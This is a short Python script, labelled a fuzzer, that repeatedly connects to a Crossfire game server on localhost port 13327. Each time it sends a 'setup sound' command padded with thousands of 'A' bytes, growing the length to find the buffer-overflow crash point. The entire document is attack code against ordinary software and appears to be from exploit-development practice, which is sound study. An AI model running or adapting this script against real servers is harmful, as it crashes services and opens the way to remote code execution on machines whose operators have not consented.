#!/usr/bin/python3
# Fuzzer by x41 - v1.0 - Crossfire
import socket
import time

host = "127.0.0.1"
port = 13327
counter = 4379

while (counter < 10000):
        crash = b'\x41' * counter
        buffer = b'\x11(setup sound ' + crash + b'\x90\x00#'

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        data = s.recv(1024)

        print("[+] Buffersize {}".format(counter))
        s.send(buffer)
        s.close()

        time.sleep(1)
        counter += 1

